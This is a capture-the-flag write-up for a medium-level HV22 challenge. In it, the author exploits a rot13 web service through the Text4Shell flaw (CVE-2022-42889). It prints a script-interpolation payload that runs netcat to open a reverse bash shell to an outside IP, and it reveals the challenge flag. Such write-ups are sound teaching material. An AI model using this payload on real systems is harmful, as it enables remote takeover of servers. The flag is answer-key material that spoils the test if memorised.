# 09 - Santa's Text

## Description

Level: Medium<br/>
Author: yuva

Santa recently created some Text with a 🐚, which is said to be vulnerable code. Santa has put this Text in his library,
putting the library in danger. He doesn't know yet that this could pose a risk to his server. Can you backdoor the
server and find all of Santa's secrets?

## Solution

For this challenge we are given a webservice that takes our input and returns its rot13 version:

![image1.png](image1.png)
![image2.png](image2.png)

From the challenge description, we know that we have to get some kind of reverse shell. At first, I thought that we had
to use some kind of Log4Shell vulnerability. But after a trying that for a while, I came across
[Text4Shell](https://github.com/kljunowsky/CVE-2022-42889-text4shell) which turned out to be the right exploit in this
case.

I used the following payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nc 10.13.0.0 80 -e /bin/bash')}
```

encoded it using rot13 and got a reverse shell. From there I found the flag:
`HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}`.
